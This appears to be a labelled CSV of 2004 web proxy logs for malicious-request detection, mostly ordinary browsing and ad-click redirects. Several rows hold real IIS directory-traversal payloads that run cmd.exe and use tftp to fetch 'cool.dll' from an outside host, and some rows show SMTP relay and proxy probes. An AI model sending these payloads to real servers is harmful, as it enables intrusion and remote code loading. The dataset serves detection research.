,ipaddress,dateandtime,url,statuscode,bytessent,refferer,useragent,class,malicious,url_sem_query,qtd_query_params,navegador
1208,212.160.136.163,10/Mar/2004:01:40:04 -0500,http://click.search123.com/cgi-bin/clickthru.cgi?EI=53503&Q=auto%20parts&NGT=Z8BzwYitxjrfxidVpL5odqAq+NAS+KzhzNk8XXiigTf+C0NBXk5SjzVihjvCXUSYzTa7ShdGDk2fxHxtTNCFBCLivp14+DQpnPOQ4XMWsLY4fTAbqVInyh+vowKW/5amV0hS/+wc/0g10WEUo/h6aaVDdzRkZu9hYYfwDUYwLAzLOovrdXOAirEUwkRncS9vn56C7dzsN68T21xPLw8RrLlJ0jyndluupZJWLnr4mmpmy27bm49upG+lG29I9+z+3tYCKzsk4Tc=&x=1&IP=192.168.1.103&UID=39593 ,300,361,"""http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=auto+parts""",Mozilla/4.75 [en] (WinME; I),n,0,/cgi-bin/clickthru.cgi,6,without browser
1209,212.160.136.163,10/Mar/2004:01:40:05 -0500,http://www.looksmart.com/og/pr=Psr;ro=5;rc=7;la=30183;lm=84862;kw=3143084;ed=20031223;ii=8072.6d3d.404eb829.6f9b;pn=;to=;tc=7;po=5;pc=10;pi=pza4;ts=%7Chttp://www.racing-seats-usa.com/ ,300,212,"""http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=auto+parts""",Mozilla/4.75 [en] (WinME; I),n,0,/og/pr=Psr;ro=5;rc=7;la=30183;lm=84862;kw=3143084;ed=20031223;ii=8072.6d3d.404eb829.6f9b;pn=;to=;tc=7;po=5;pc=10;pi=pza4;ts=%7Chttp://www.racing-seats-usa.com/,0,without browser
1210,212.160.136.163,10/Mar/2004:01:40:06 -0500,http://www.racing-seats-usa.com/ ,200,9283,"""http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=auto+parts""",Mozilla/4.75 [en] (WinME; I),n,0,/,0,without browser
1211,61.237.215.17,10/Mar/2004:01:40:27 -0500,http://99seek.com/search.php?ID=107&fString=Car+Rentals ,300,0,"""http://www.yanshi.cc/ys01/ys0100006/index-3-7.htm""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 95),n,0,/search.php,2,Microsoft Internet Explorer
1212,61.237.215.17,10/Mar/2004:01:40:28 -0500,http://99seek.com/search_results.php?fSearch_id=38abeb2bf0d1b025&fString=car+rentals ,200,6548,"""http://www.yanshi.cc/ys01/ys0100006/index-3-7.htm""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 95),n,0,/search_results.php,2,Microsoft Internet Explorer
1213,61.237.215.17,10/Mar/2004:01:40:30 -0500,http://99seek.com/redirect.php?fID=10597268 ,300,0,"""http://99seek.com/search_results.php?fSearch_id=38abeb2bf0d1b025&fString=car+rentals""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 95),n,0,/redirect.php,1,Microsoft Internet Explorer
1214,61.237.215.17,10/Mar/2004:01:40:31 -0500,http://xml.seek99.com/go2.htm?a=%CB%9D%C3%19U&bid=aascaaafaxaz&url=http%3A%2F%2Fpartners.mygeek.com%2Fpresults.jsp%3Fpartnerid%3D98607%26vendorId%3D82212%26type%3D5%26code%3D1%26rate%3D543362362%26cr%3D543362362%26domain%3Dwww.2020search.com%26query%3D1078900826570%253A%253A66.70.88.60%253A%253Acar%2Brentals%26url%3Dhttp%253A%252F%252Fwww.2020search.com%252Ftoolbar%252Finstall.html%253FKeywords%253Dcar%252520rentals&valsearch=1 ,200,566,"""http://99seek.com/search_results.php?fSearch_id=38abeb2bf0d1b025&fString=car+rentals""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 95),m,1,/go2.htm,4,Microsoft Internet Explorer
1215,68.48.142.117,10/Mar/2004:01:40:52 -0500,/c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/c/winnt/system32/cmd.exe,0,without browser
1216,68.48.142.117,10/Mar/2004:01:40:53 -0500,/c/httpodbc.dll ,400,282,"""-""",-,m,1,/c/httpodbc.dll,0,without browser
1217,24.235.131.196,10/Mar/2004:01:40:58 -0500,http://www.youngvagina.com/iframe.php ,500,539,"""http://www.youngvagina.com/iframe.php""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98),n,0,/iframe.php,0,Microsoft Internet Explorer
1218,68.48.142.117,10/Mar/2004:01:41:43 -0500,/d/winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/d/winnt/system32/cmd.exe,0,without browser
1219,192.117.242.67,10/Mar/2004:01:41:51 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
1220,12.221.212.151,10/Mar/2004:01:41:51 -0500,http://www.sapphicerotica.com/members/index.html ,200,0,"""http://www.sapphicerotica.com/members/index.html""",Mozilla/4.0 ( compatible; MSIE 5.5; Windows 98; DigiExt ),n,0,/members/index.html,0,Microsoft Internet Explorer
1221,12.221.212.151,10/Mar/2004:01:41:52 -0500,http://www.sapphicerotica.com/members/index.html ,200,0,"""http://www.sapphicerotica.com/members/index.html""",Mozilla/4.7 ( compatible; [fr]; Windows 98; athome020 ),n,0,/members/index.html,0,without browser
1222,68.48.142.117,10/Mar/2004:01:42:33 -0500,/d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/d/winnt/system32/cmd.exe,0,without browser
1223,212.160.136.163,10/Mar/2004:01:43:07 -0500,http://www.1000search.com/?username=zbrown ,200,22149,"""http://www.powerlift.ifbbpro.net/""",Mozilla/4.0 (compatible; MSIE 5.02; Windows ME),n,0,/,1,Microsoft Internet Explorer
1224,212.160.136.163,10/Mar/2004:01:43:12 -0500,http://www.clickcheaper.com/search.php?username=aklimczyk&keywords=capital ,200,18009,"""http://www.bodybuilding.powerlifting.ifbbpro.net/""",Mozilla/4.0 (compatible; MSIE 5.5; Windows ME),n,0,/search.php,2,Microsoft Internet Explorer
1225,212.160.136.163,10/Mar/2004:01:43:15 -0500,http://clickcheaper.com/go.php?b=zhhazozyzxhchc&k=svsiafsmazacac&u=snskansososkayaiad&l=spssshhdasspakazsmanacamadfmhcxnsicpzazhavapakaaazhaadzhhoahhyavaxavzzhczczpzzzshhaczzhfhszzsozszvcofocahshfsvsozyhiszasaahczvzvzmzcsmhhsaazadzcazsfsnzfzizfshsyzcamakddxvfvhxzozyzpziacaianzchhachcsnszsmsxhohfsxzpzdhhhdhizozczmzkskzkhzdfcyfvsmzfsmsmsahyzphfzcssaxzcakzosxafakzzzzzsaaapshhyakshsnhmaassacfydvchsfzzavsxaxzfzkzphahszzsvzzahhysmspsihdzozxzihxhvafzzshsxadhkaodddnfksxaaspzssahmzfzmzkznsvsdsvssaoanhyanaxsohvayszaosmaiazhdaxafskxfxscfsxanaosn&s=axsssismazfp&t= ,300,0,"""http://www.clickcheaper.com/search.php?username=aklimczyk&keywords=capital""",Mozilla/4.0 (compatible; MSIE 5.5; Windows ME),m,1,/go.php,6,Microsoft Internet Explorer
1226,212.160.136.163,10/Mar/2004:01:43:21 -0500,http://clickcheaper.com/go.php?u=snskansososkayaiad&l=spssshhdasspakazsmanacamadfmhcxnsicpzazhavapakaaazhaadzhhoahhyavaxavzzhczczpzzzshhaczzhfhszzsozszvcofocahshfsvsozyhiszasaahczvzvzmzcsmhhsaazadzcazsfsnzfzizfshsyzcamakddxvfvhxzozyzpziacaianzchhachcsnszsmsxhohfsxzpzdhhhdhizozczmzkskzkhzdfcyfvsmzfsmsmsahyzphfzcssaxzcakzosxafakzzzzzsaaapshhyakshsnhmaassacfydvchsfzzavsxaxzfzkzphahszzsvzzahhysmspsihdzozxzihxhvafzzshsxadhkaodddnfksxaaspzssahmzfzmzkznsvsdsvssaoanhyanaxsohvayszaosmaiazhdaxafskxfxscfsxanaosn&k=svsiafsmazacac&b=zhhazozyzxhchc&s=axsssismazfp&x=&t=&tw=&f=c0beb3a42f2f1bf3125613b3d6a8de63 ,300,0,"""http://www.clickcheaper.com/search.php?username=aklimczyk&keywords=capital""",Mozilla/4.0 (compatible; MSIE 5.5; Windows ME),m,1,/go.php,6,Microsoft Internet Explorer
1227,212.160.136.163,10/Mar/2004:01:43:22 -0500,http://www.1000search.com/search.php?keywords=Incorporation&username=zbrown ,200,21422,"""http://www.1000search.com/?username=zbrown""",Mozilla/4.0 (compatible; MSIE 5.02; Windows ME),n,0,/search.php,2,Microsoft Internet Explorer
1228,212.160.136.163,10/Mar/2004:01:43:23 -0500,http://www.epilot.com/click.aspx?k=capital&b=1400&p=epilot&s=seeky&pos=1&t=0&kid=bd0b06f3-9085-47e0-bbed-1fa05e57523d&ep=1&sid=b022ac98-86cf-49e0-8c96-9e3837344dfb&l=http:%2F%2Fascticket.com ,300,264,"""http://www.clickcheaper.com/search.php?username=aklimczyk&keywords=capital""",Mozilla/4.0 (compatible; MSIE 5.5; Windows ME),n,0,/click.aspx,10,Microsoft Internet Explorer
1229,68.48.142.117,10/Mar/2004:01:43:23 -0500,/d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/d/winnt/system32/cmd.exe,0,without browser
1230,212.160.136.163,10/Mar/2004:01:43:25 -0500,http://www.1000search.com/go.php?b=zzhnhzzkzozh&k=aospasavsoasaxsxasacsisvas&u=aosfszamsian&l=zphohdzvhpzizhhzzizizmhnhxzdsnsxhdhfzxzczyhyhfzdafsdadzfzzzazyhihmaozhzafahdzxhazkdnhahmsvansdfssazcznhpfnzvdzdvaxhfziskfkscfadvhdanaphxsxsfzzamsydifxsxzchdzozxdsavsyzksodnsffisisxazfssmfpafaxayaaffdszpdnfafmfszfaosksdzzdhsfdkzmhmdoamfadszxdsszhfdfsxsiapaasxfsfvfxfhsxahfczczadzakavdffsfihxfsdsazdfshdofkdasmszfxzcacddfaaofifksmavdaaidzapacachkaxayfzaddvfdaxssfhskfpasdzzcfssxasskdydfhyzodhffazsyfcskavamsnsvdzsdfzshdvfkzzdvhhhmsvzizxzazzzsznhsddfyhshsafhozxhaavaiasfysnasssaoacafdfsmdzzozcdmdmsszfzchvaoakamspaafhsfschpfiskszhsfifzachdzxhasvassdaxsxfhadaxzfzchvsoshahamsxavfpdpakzmhpzdzxhaavsdzphmfxzyzodzsmacasznhcsoahshzksxaiahafamsaaxaxavspacayahznsozfscakzaskhvaoshsfhmaisifzhdavsdhaavaxshzpszscskamadskscamsxsfhmakacsfzvhahvacafsdss&tw=zhhahyzkhdzizohdzhzh&s=soapazsoacshasspsxaf&t= ,300,0,"""http://www.1000search.com/search.php?keywords=Incorporation&username=zbrown""",Mozilla/4.0 (compatible; MSIE 5.02; Windows ME),n,0,/go.php,7,Microsoft Internet Explorer
1231,212.160.136.163,10/Mar/2004:01:43:27 -0500,http://www.1000search.com/go.php?u=aosfszamsian&l=zphohdzvhpzizhhzzizizmhnhxzdsnsxhdhfzxzczyhyhfzdafsdadzfzzzazyhihmaozhzafahdzxhazkdnhahmsvansdfssazcznhpfnzvdzdvaxhfziskfkscfadvhdanaphxsxsfzzamsydifxsxzchdzozxdsavsyzksodnsffisisxazfssmfpafaxayaaffdszpdnfafmfszfaosksdzzdhsfdkzmhmdoamfadszxdsszhfdfsxsiapaasxfsfvfxfhsxahfczczadzakavdffsfihxfsdsazdfshdofkdasmszfxzcacddfaaofifksmavdaaidzapacachkaxayfzaddvfdaxssfhskfpasdzzcfssxasskdydfhyzodhffazsyfcskavamsnsvdzsdfzshdvfkzzdvhhhmsvzizxzazzzsznhsddfyhshsafhozxhaavaiasfysnasssaoacafdfsmdzzozcdmdmsszfzchvaoakamspaafhsfschpfiskszhsfifzachdzxhasvassdaxsxfhadaxzfzchvsoshahamsxavfpdpakzmhpzdzxhaavsdzphmfxzyzodzsmacasznhcsoahshzksxaiahafamsaaxaxavspacayahznsozfscakzaskhvaoshsfhmaisifzhdavsdhaavaxshzpszscskamadskscamsxsfhmakacsfzvhahvacafsdss&k=aospasavsoasaxsxasacsisvas&b=zzhnhzzkzozh&s=soapazsoacshasspsxaf&x=&t=&tw=zhhahyzkhdzizohdzhzh&f=ee43c5a5ff8b3338ac9182dff65f620d ,300,0,"""http://www.1000search.com/search.php?keywords=Incorporation&username=zbrown""",Mozilla/4.0 (compatible; MSIE 5.02; Windows ME),m,1,/go.php,7,Microsoft Internet Explorer
1232,81.215.8.250,10/Mar/2004:01:43:27 -0500,http://www.sun.com/ ,200,0,"""-""",Mozilla/4.0 (compatible; ICS),n,0,/,0,without browser
1233,203.121.182.142,10/Mar/2004:01:43:33 -0500,168.226.188.196:25 ,500,436,"""-""",-,n,0,168.226.188.196:25,0,without browser
1234,212.160.136.163,10/Mar/2004:01:43:40 -0500,http://ascticket.com/ ,200,80023,"""http://www.clickcheaper.com/search.php?username=aklimczyk&keywords=capital""",Mozilla/4.0 (compatible; MSIE 5.5; Windows ME),n,0,/,0,Microsoft Internet Explorer
1235,220.173.17.142,10/Mar/2004:01:43:59 -0500,http://www.cueoo.com//search.php?str=Credit+Cards ,200,19634,"""http://www.163.net""",Mozilla/4.0 (compatible; MSIE 4.01; Windows NT),n,0,//search.php,1,Microsoft Internet Explorer
1236,220.173.17.142,10/Mar/2004:01:44:00 -0500,http://www.cueoo.com//index.php?mode=rd&id=9&position=10&PPC20=cca3f26e973c7d17a02fa4bf476e1b69 ,200,1109,"""http://www.cueoo.com//search.php?str=Credit+Cards""",Mozilla/4.0 (compatible; MSIE 4.01; Windows NT),n,0,//index.php,4,Microsoft Internet Explorer
1237,192.117.242.67,10/Mar/2004:01:44:00 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
1238,192.117.242.67,10/Mar/2004:01:44:03 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
1239,68.48.142.117,10/Mar/2004:01:44:13 -0500,/d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/d/winnt/system32/cmd.exe,0,without browser
1240,68.48.142.117,10/Mar/2004:01:44:13 -0500,/d/httpodbc.dll ,400,282,"""-""",-,m,1,/d/httpodbc.dll,0,without browser
1241,212.160.136.163,10/Mar/2004:01:44:18 -0500,http://www.searchfeed.com/rd/Clk.jsp?s=wf&k=incorporation&lnk2=rhhE%3F..iy29%27wBAyekxpr%27fsCqvrkh%27pDB.osC.fsCqvrkh%27qAA%3EpAsplhrxDigr%29t%3DH8441%29w%3D8MYnDiJjafrmFxnJI39MPmrpH3JaYsLgoTYsTnd6wobCvQmhUQnHSe3EthJSNdTcRH4ESMrwN%3FilPBHGehblqY4yY3RRaU85KwV0iwu7PHTC6QJhwodGzUuflUjZa0vdY3873eQOvf8ie3bz0TTaEm96oYJ7A242gQizw%7C2%27G4&p=4351&sid=473226&ex=1078900997556 ,200,566,"""http://www.1000search.com/search.php?keywords=Incorporation&username=zbrown""",Mozilla/4.0 (compatible; MSIE 5.02; Windows ME),m,1,/rd/Clk.jsp,6,Microsoft Internet Explorer
1242,212.160.136.163,10/Mar/2004:01:44:43 -0500,http://seek99.com/search.htm?aid=19448&keywords=freeware ,200,13723,"""http://www.dogs.homerescue.org/""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/search.htm,2,Microsoft Internet Explorer
1243,212.160.136.163,10/Mar/2004:01:44:45 -0500,http://seek99.com/go2.htm?a=%CB%8A%7F%C3S&bid=aascaaafaaac&url=http%3A%2F%2Ffeed.genieknows.com%2Fsearch%2Fxml%2FMonitor%3Fenc%3Dwo%2524y%2525uMx%2525%2525%2521J%253F%253F%2523tA%253Ewq%257Cq%2529%2A%2524uq%2523sx%253Es%2B%257D%253Fz%2524Os%257Cys%257BYtM%2521wXZUIt%2522%2525%257C%257B6worytM%2540%253E%2540AH6s%2Bro%2527q%257CM%2540%253E%2540%2540GAIIIIIFI%2540%2540EEHDH6wo%2522%2523%2AMv%2523uu%2528q%2523u6woqvvytMH6woy%2521MFH%253EDH%253EA%2540F%253EA%2540I6wosqsxuM%255E6wos%257CytMcUU%255BIIoHHFI%2501 ,200,566,"""http://seek99.com/search.htm?aid=19448&keywords=freeware""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),m,1,/go2.htm,3,Microsoft Internet Explorer
1244,68.48.142.117,10/Mar/2004:01:45:03 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
1245,203.121.182.140,10/Mar/2004:01:45:04 -0500,148.246.74.61:25 ,500,434,"""-""",-,n,0,148.246.74.61:25,0,without browser
1246,221.7.192.11,10/Mar/2004:01:45:41 -0500,http://www.ccbbs.cn/ ,200,15631,"""http://www.ccbbs.cn""",Mozilla/4.0 (compatible; MSIE 5.02; Windows 98),n,0,/,0,Microsoft Internet Explorer
1247,203.121.182.144,10/Mar/2004:01:45:45 -0500,202.154.4.25:25 ,500,430,"""-""",-,n,0,202.154.4.25:25,0,without browser
1248,203.121.182.145,10/Mar/2004:01:45:50 -0500,210.242.12.243:25 ,200,0,"""-""",-,n,0,210.242.12.243:25,0,without browser
1249,212.160.136.163,10/Mar/2004:01:45:51 -0500,http://www.lookportal.com/search/smartsearch.cgi?username=bmocking&keywords=improvement ,200,105,"""http://www.geminidogs.homerescue.org/""",Mozilla/4.0 (compatible; MSIE 4.01; Windows NT),n,0,/search/smartsearch.cgi,2,Microsoft Internet Explorer
1250,221.7.192.11,10/Mar/2004:01:45:53 -0500,http://ccbbs.cn/index.asp ,200,12711,"""http://ccbbs.cn/index.asp""",Mozilla/4.0 (compatible; MSIE 4.0; Windows NT),n,0,/index.asp,0,Microsoft Internet Explorer
1251,68.48.142.117,10/Mar/2004:01:45:54 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
1252,12.221.212.151,10/Mar/2004:01:46:17 -0500,http://www.sapphicerotica.com/members/index.html ,200,0,"""http://www.sapphicerotica.com/members/index.html""",Mozilla/4.0 ( compatible; [de]; Windows NT5.0; Compaq ),n,0,/members/index.html,0,without browser
1253,12.221.212.151,10/Mar/2004:01:46:17 -0500,http://www.sapphicerotica.com/members/index.html ,200,0,"""http://www.sapphicerotica.com/members/index.html""",Mozilla/4.7 ( compatible; MSIE 5.01; Windows 95; FREEI v2.53 ),n,0,/members/index.html,0,Microsoft Internet Explorer
1254,81.215.8.250,10/Mar/2004:01:46:33 -0500,http://n3t.net/cgi-bin/prxjdg-e.cgi ,200,1532,"""-""",Mozilla/4.0 (compatible; ICS),n,0,/cgi-bin/prxjdg-e.cgi,0,without browser
1255,12.221.212.151,10/Mar/2004:01:46:35 -0500,http://www.sapphicerotica.com/members/index.html ,200,0,"""http://www.sapphicerotica.com/members/index.html""",Mozilla/4.6 ( compatible; [fr]; Windows 95; DigiExt ),n,0,/members/index.html,0,without browser
1256,192.117.242.67,10/Mar/2004:01:46:43 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
1257,68.48.142.117,10/Mar/2004:01:46:44 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
1258,61.237.215.17,10/Mar/2004:01:46:58 -0500,http://99seek.com/search.php?ID=107&fString=Outdoor+Recreation ,300,0,"""http://www.yanshi.cc/ys01/ys0100006/index-3-7.htm""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/search.php,2,Microsoft Internet Explorer
1259,61.237.215.17,10/Mar/2004:01:46:59 -0500,http://99seek.com/search_results.php?fSearch_id=17d0b0961ad69403&fString=outdoor+recreation ,200,6049,"""http://www.yanshi.cc/ys01/ys0100006/index-3-7.htm""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/search_results.php,2,Microsoft Internet Explorer
1260,61.237.215.17,10/Mar/2004:01:47:04 -0500,http://99seek.com/redirect.php?fID=10597503 ,300,0,"""http://99seek.com/search_results.php?fSearch_id=17d0b0961ad69403&fString=outdoor+recreation""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/redirect.php,1,Microsoft Internet Explorer
1261,61.237.215.17,10/Mar/2004:01:47:06 -0500,http://99seek.com/ ,200,12068,"""http://99seek.com/search_results.php?fSearch_id=17d0b0961ad69403&fString=outdoor+recreation""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/,0,Microsoft Internet Explorer
1262,68.48.142.117,10/Mar/2004:01:47:34 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
1263,203.61.199.98,10/Mar/2004:01:47:35 -0500,http://hpcgi1.nifty.com/trino/ProxyJ/prxjdg.cgi ,200,2030,"""-""",Mozilla/3.0 (compatible),n,0,/trino/ProxyJ/prxjdg.cgi,0,without browser
1264,221.7.192.11,10/Mar/2004:01:48:02 -0500,http://ccbbs.cn/ ,200,12711,"""http://ccbbs.cn""",Mozilla/4.0 (compatible; MSIE 5.02; Windows 98),n,0,/,0,Microsoft Internet Explorer
1265,68.48.142.117,10/Mar/2004:01:48:24 -0500,/scripts/..%255c../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../httpodbc.dll,0,without browser
1266,192.117.242.67,10/Mar/2004:01:48:54 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
1267,192.117.242.67,10/Mar/2004:01:48:54 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
1268,68.48.142.117,10/Mar/2004:01:49:14 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
1269,24.201.201.176,10/Mar/2004:01:49:16 -0500,http://www.ropile.com/ ,200,5186,"""http://www.clixgalore.com""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/,0,Microsoft Internet Explorer
1270,212.160.136.163,10/Mar/2004:01:49:51 -0500,http://seek99.com/search.htm?aid=19565&keywords=flower ,200,14076,"""http://www.power.liftings.ifbbpro.net/""",Mozilla/4.0 (compatible; MSIE 4.0; Windows NT),n,0,/search.htm,2,Microsoft Internet Explorer
1271,212.160.136.163,10/Mar/2004:01:49:54 -0500,http://seek99.com/go2.htm?a=%CB%8A9%13%5B&bid=aascaaafaxaz&url=http%3A%2F%2Fpartners.mygeek.com%2Fpresults.jsp%3Fpartnerid%3D98607%26vendorId%3D82212%26type%3D5%26code%3D1%26rate%3D543362362%26cr%3D543362362%26domain%3Dwww.2020search.com%26query%3D1078901388796%253A%253A192.168.1.103%253A%253Aflower%26url%3Dhttp%253A%252F%252Fwww.2020search.com%252Ftoolbar%252Finstall.html%253FKeywords%253Dflower ,200,566,"""http://seek99.com/search.htm?aid=19565&keywords=flower""",Mozilla/4.0 (compatible; MSIE 4.0; Windows NT),m,1,/go2.htm,3,Microsoft Internet Explorer
1272,68.48.142.117,10/Mar/2004:01:50:04 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
1273,81.215.8.250,10/Mar/2004:01:50:15 -0500,http://members.sexy-babes.tv/ ,200,566,"""http://members.sexy-babes.tv/""",Mozilla/4.73 ( compatible; [en]; Windows 98; athome020 ),n,0,/,0,without browser
1274,220.173.17.142,10/Mar/2004:01:50:25 -0500,http://www.leadhound.com/show2.php?id=11171&bid=35393 ,200,12179,"""http://www.business2join.com""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/show2.php,2,Microsoft Internet Explorer
1275,68.48.142.117,10/Mar/2004:01:50:55 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
1276,81.215.8.250,10/Mar/2004:01:51:06 -0500,http://members.sexy-babes.tv/ ,200,566,"""http://members.sexy-babes.tv/""",Mozilla/4.73 ( compatible; [en]; Windows 98; athome020 ),n,0,/,0,without browser
1277,81.215.8.250,10/Mar/2004:01:51:07 -0500,http://members.sexy-babes.tv/ ,200,566,"""http://members.sexy-babes.tv/""",Mozilla/5.0 ( compatible; [jp]; Windows 95; win9x/NT 4.90 ),n,0,/,0,without browser
1278,12.221.212.151,10/Mar/2004:01:51:14 -0500,http://www.sapphicerotica.com/members/index.html ,200,0,"""http://www.sapphicerotica.com/members/index.html""",Mozilla/5.0 ( compatible; [de]; Windows NT5.0; Compaq ),n,0,/members/index.html,0,without browser
1279,12.221.212.151,10/Mar/2004:01:51:15 -0500,http://www.sapphicerotica.com/members/index.html ,200,0,"""http://www.sapphicerotica.com/members/index.html""",Mozilla/4.0 ( compatible; [en]; Windows 98; athome020 ),n,0,/members/index.html,0,without browser
1280,81.215.8.250,10/Mar/2004:01:51:33 -0500,http://members.sexy-babes.tv/ ,200,566,"""http://members.sexy-babes.tv/""",Mozilla/4.73 ( compatible; [en]; Windows 98; athome020 ),n,0,/,0,without browser
1281,61.53.76.40,10/Mar/2004:01:51:33 -0500,http://69.59.175.60/found-best.com/search.php ,200,12847,"""http://www.sanlala.com/index.html""",Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0),n,0,/found-best.com/search.php,0,Microsoft Internet Explorer
1282,192.117.242.67,10/Mar/2004:01:51:40 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
1283,68.48.142.117,10/Mar/2004:01:51:47 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
1284,161.142.39.204,10/Mar/2004:01:52:04 -0500,stockholm.se.eu.undernet.org:6666 ,200,0,"""-""",-,n,0,stockholm.se.eu.undernet.org:6666,0,without browser
1285,193.109.122.14,10/Mar/2004:01:52:07 -0500,193.109.122.67:6668 ,400,290,"""-""",pxyscand/2.0,n,0,193.109.122.67:6668,0,without browser
1286,161.142.39.204,10/Mar/2004:01:52:08 -0500,graz2.at.eu.undernet.org:7000 ,400,300,"""-""",-,n,0,graz2.at.eu.undernet.org:7000,0,without browser
1287,193.109.122.58,10/Mar/2004:01:52:09 -0500,193.109.122.67:6668 ,400,290,"""-""",pxyscand/2.0,n,0,193.109.122.67:6668,0,without browser
1288,193.109.122.21,10/Mar/2004:01:52:11 -0500,193.109.122.67:6668 ,400,290,"""-""",pxyscand/2.0,n,0,193.109.122.67:6668,0,without browser
